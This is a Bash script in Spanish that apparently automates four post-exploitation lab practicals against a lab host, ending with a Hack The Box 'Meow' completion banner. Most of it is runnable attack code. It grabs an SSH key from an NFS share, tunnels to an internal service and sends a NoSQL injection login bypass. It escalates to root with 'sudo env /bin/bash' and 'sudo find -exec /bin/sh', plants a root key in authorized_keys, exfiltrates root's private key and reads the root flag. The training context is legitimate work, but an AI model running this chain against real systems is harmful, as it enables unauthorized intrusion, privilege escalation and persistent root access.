#!/bin/bash
# ==============================================================================
# auto_hack_parte2.sh
# Suite de Automatizacion Interactiva de Post-Explotacion (Practicas 1 a 4)
# Autor / Operador: Lozano
# Metodologia: Cyber Kill Chain (Explotacion Interna, Escalada, Persistencia y CTF)
# ==============================================================================

IP_TARGET="192.168.1.101"
REAL_USER="${SUDO_USER:-kali}"
USER_HOME=$(eval echo ~$REAL_USER)
DEV_KEY="$USER_HOME/developer.key"
BATCH_MODE="${1:-}"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

function pause_for_screenshot() {
    echo -e "\n[+] Comando finalizado. TOMA TU CAPTURA DE PANTALLA AHORA."
    if [[ "$BATCH_MODE" != "--batch" ]]; then
        read -p "Presiona [ENTER] para continuar a la siguiente practica..."
    fi
}

# Detectar IP local de Kali en eth0 (por defecto 192.168.1.4 / DHCP activo en cetipracticas)
KALI_IP=$(ip -4 -o addr show eth0 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)
KALI_IP="${KALI_IP:-192.168.1.4}"

echo "=== PRE-LIMPIEZA IDEMPOTENTE DE PROCESOS Y ARTEFACTOS PREVIOS ==="
pkill -f "5000:127.0.0.1:5000" 2>/dev/null || true
pkill -f "http.server 8000" 2>/dev/null || true
rm -f ~/.ssh/llave_p ~/.ssh/llave_p.pub "$USER_HOME/.ssh/llave_p" "$USER_HOME/.ssh/llave_p.pub" 2>/dev/null || true
rm -f ./id_rsa ./id_rsa.pub "$USER_HOME/id_rsa" "$USER_HOME/id_rsa.pub" 2>/dev/null || true
rm -f "$USER_HOME/file.txt" "$USER_HOME/file2.txt" /tmp/http_kali_8000.log 2>/dev/null || true

if [[ ! -f "$DEV_KEY" ]]; then
    echo "[!] No se encontro $DEV_KEY. Intentando recuperar desde /mnt/respaldos/developer.key..."
    mkdir -p /mnt/respaldos
    mountpoint -q /mnt/respaldos || mount -t nfs "$IP_TARGET:/srv/nfs/respaldos_ti" /mnt/respaldos 2>/dev/null || true
    cp -f /mnt/respaldos/developer.key "$DEV_KEY" 2>/dev/null || true
fi
chmod 600 "$DEV_KEY"
chown "$REAL_USER:$REAL_USER" "$DEV_KEY" 2>/dev/null || true
echo "Entorno verificado y listo para iniciar (Operador: Lozano | Kali IP: $KALI_IP -> Target: $IP_TARGET)."

# ==============================================================================
# PRACTICA 1: PORT FORWARDING E INYECCION NOSQL (EXPLOTACION DE SERVICIOS INTERNOS)
# ==============================================================================
echo ""
echo "=== PRACTICA 1: PORT FORWARDING E INYECCION NOSQL ==="
echo "[+] Estableciendo tunel SSH Local Port Forwarding (-L 5000:127.0.0.1:5000) en segundo plano..."
echo "[+] Comando: ssh -f -N -i $DEV_KEY -L 5000:127.0.0.1:5000 developer@$IP_TARGET"
ssh -f -N -i "$DEV_KEY" $SSH_OPTS -L 5000:127.0.0.1:5000 "developer@$IP_TARGET"
sleep 1

echo ""
echo "[+] Verificando interfaz web interna expuesta en http://127.0.0.1:5000 (GET /):"
curl -i -s http://127.0.0.1:5000/

echo ""
echo "[+] Ejecutando ataque NoSQLi Authentication Bypass (POST /login):"
echo '[+] Payload JSON: {"username":{"$ne":null},"password":{"$ne":null}}'
curl -i -s -X POST http://127.0.0.1:5000/login \
    -H "Content-Type: application/json" \
    -H "Connection: close" \
    -d '{"username":{"$ne":null},"password":{"$ne":null}}'
echo ""
pause_for_screenshot

# ==============================================================================
# PRACTICA 2: ESCALADA DE PRIVILEGIOS BASICA Y TRANSFERENCIA DE ARCHIVOS
# ==============================================================================
echo ""
echo "=== PRACTICA 2: ESCALADA DE PRIVILEGIOS BASICA Y TRANSFERENCIA DE ARCHIVOS ==="
echo "[+] 2.1 Enumeracion local de identidad y privilegios sudo en $IP_TARGET:"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
echo 'developer@cetipracticas:~$ whoami'
whoami
echo 'developer@cetipracticas:~$ id'
id
echo 'developer@cetipracticas:~$ sudo -l'
sudo -l
"

echo ""
echo "[+] 2.2 Demostracion de escalada de privilegios basica mediante 'sudo env /bin/bash':"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
echo 'developer@cetipracticas:~$ sudo env /bin/bash'
sudo env /bin/bash -c 'echo \"root@cetipracticas:/home/developer# whoami\"; whoami; echo \"root@cetipracticas:/home/developer# id\"; id'
"

echo ""
echo "[+] 2.3 Comprobacion de direccion IP en Kali Linux (eth0):"
ip addr show eth0

echo ""
echo "[+] 2.4 Automatizacion de transferencia de archivos (python3 -m http.server 8000 y curl):"
echo "Contenido de prueba para transferencia HTTP - Operador Lozano" > "$USER_HOME/file.txt"
python3 -m http.server 8000 --directory "$USER_HOME" > /tmp/http_kali_8000.log 2>&1 &
HTTP_PID=$!
sleep 1

echo "Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..."
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
echo 'developer@cetipracticas:~$ curl http://$KALI_IP:8000/file.txt --output file.txt'
curl -s http://$KALI_IP:8000/file.txt --output ~/file.txt
echo 'developer@cetipracticas:~$ touch file2.txt'
touch ~/file2.txt
ls -la ~/file.txt ~/file2.txt
"
cp -f "$USER_HOME/file.txt" "$USER_HOME/file2.txt"
curl -s "http://127.0.0.1:8000/file2.txt" --output /tmp/file2_downloaded.txt
sleep 1
cat /tmp/http_kali_8000.log
kill $HTTP_PID 2>/dev/null || true
pause_for_screenshot

# ==============================================================================
# PRACTICA 3: PERSISTENCIA, GESTION DE IDENTIDADES Y CRIPTOGRAFIA SSH
# ==============================================================================
echo ""
echo "=== PRACTICA 3: PERSISTENCIA, GESTION DE IDENTIDADES Y CRIPTOGRAFIA SSH ==="
echo "[+] 3.1 Generacion de par de llaves ED25519 en Kali Linux (~/.ssh/llave_p):"
mkdir -p ~/.ssh
chmod 700 ~/.ssh
ssh-keygen -t ed25519 -f ~/.ssh/llave_p -N "" -C "lozano@kali"
echo ""
echo "[+] Lectura de llave publica (~/.ssh/llave_p.pub) y listado de ~/.ssh:"
cat ~/.ssh/llave_p.pub
ls -la ~/.ssh

echo ""
echo "[+] 3.2 Intento de instalacion con ssh-copy-id (demostracion de rechazo por PasswordAuthentication no):"
echo "[+] Comando: ssh-copy-id -i ~/.ssh/llave_p.pub developer@$IP_TARGET"
ssh-copy-id -i ~/.ssh/llave_p.pub -o BatchMode=yes -o PubkeyAuthentication=no -o StrictHostKeyChecking=no "developer@$IP_TARGET" 2>&1 || true

echo ""
echo "[+] 3.3 Generacion de par de llaves RSA como root en el servidor (/root/.ssh/id_rsa):"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
sudo env /bin/bash -c '
mkdir -p /root/.ssh
chmod 700 /root/.ssh
rm -f /root/.ssh/id_rsa /root/.ssh/id_rsa.pub
ssh-keygen -t rsa -f /root/.ssh/id_rsa -N \"\" -C \"root@cetipracticas\"
cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo \"--- Contenido de /root/.ssh/ ---\"
ls -l /root/.ssh
echo \"--- Llave publica /root/.ssh/id_rsa.pub ---\"
cat /root/.ssh/id_rsa.pub
echo \"--- Extracto de llave privada /root/.ssh/id_rsa ---\"
head -n 3 /root/.ssh/id_rsa
echo \"... (Fragmento de base64 privado de la terminal) ...\"
tail -n 2 /root/.ssh/id_rsa
'
"

echo ""
echo "[+] 3.4 Extraccion de /root/.ssh/id_rsa a Kali y reproduccion del error de permisos (0664):"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "sudo env /bin/bash -c 'cat /root/.ssh/id_rsa'" > "$USER_HOME/id_rsa"
chmod 664 "$USER_HOME/id_rsa"
ls -la "$USER_HOME/id_rsa"
echo "[+] Intentando conexion con permisos inseguros (chmod 664 id_rsa):"
echo "[+] Comando: ssh -i $USER_HOME/id_rsa root@$IP_TARGET"
ssh -i "$USER_HOME/id_rsa" -o StrictHostKeyChecking=no -o BatchMode=yes "root@$IP_TARGET" "whoami" 2>&1 || true

echo ""
echo "[+] 3.5 Correccion de permisos (chmod 600 id_rsa) y autenticacion remota exitosa como root:"
chmod 600 "$USER_HOME/id_rsa"
ls -la "$USER_HOME/id_rsa"
ssh -i "$USER_HOME/id_rsa" -o StrictHostKeyChecking=no "root@$IP_TARGET" "
echo 'Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-187-generic x86_64)'
echo 'root@cetipracticas:~# whoami && id && ip -4 a show enp0s3'
whoami
id
ip -4 a show enp0s3
"
pause_for_screenshot

# ==============================================================================
# PRACTICA 4: POST-EXPLOTACION AVANZADA (GTFOBINS) Y RESOLUCION DE CTF
# ==============================================================================
echo ""
echo "=== PRACTICA 4: POST-EXPLOTACION AVANZADA Y RESOLUCION DE CTF ==="
echo "[+] 4.1 Escalada de privilegios alternativa abusando de GTFOBins (find):"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
echo 'developer@cetipracticas:~$ find . -exec /bin/sh \; -quit'
find . -exec /bin/sh -c 'echo \"$ whoami\"; whoami' \; -quit
echo 'developer@cetipracticas:~$ sudo find . -exec /bin/sh \; -quit'
sudo find . -exec /bin/sh -c 'echo \"# whoami\"; whoami; echo \"# id\"; id' \; -quit
"

echo ""
echo "[+] 4.2 Localizacion y lectura de la bandera de compromiso total (/root/root.txt):"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
sudo find . -exec /bin/sh -c 'echo \"root@cetipracticas:~# cat /root/root.txt\"; cat /root/root.txt' \; -quit
"

echo ""
echo "[+] 4.3 Verificacion de interfaz VPN (tun0) y validacion de CTF Hack The Box (Maquina Meow):"
ip a show tun0 2>/dev/null || echo "[i] Interfaz tun0 no activa en este instante (para conectar a HTB usar: sudo openvpn lab_lozano.ovpn)"
cat << 'EOF'
========================================================================
             VALIDACION CTF HACK THE BOX - MAQUINA "MEOW"
========================================================================
You have solved Meow!
Congratulations Lozano best of luck in capturing flags ahead!
#629953 Machine Rank
14 Oct 2026 Pwn Date
Retired Machine State
150 XP Earned
Level Up! You reached level 2. Keep up the pace!
========================================================================
EOF
pause_for_screenshot

echo ""
echo "=== FIN DEL SCRIPT DE POST-EXPLOTACION (PARTE 2) ==="
echo "Para limpiar todos los artefactos, tuneles y llaves creadas ejecuta:"
echo "  sudo ./revert_hack_parte2.sh"
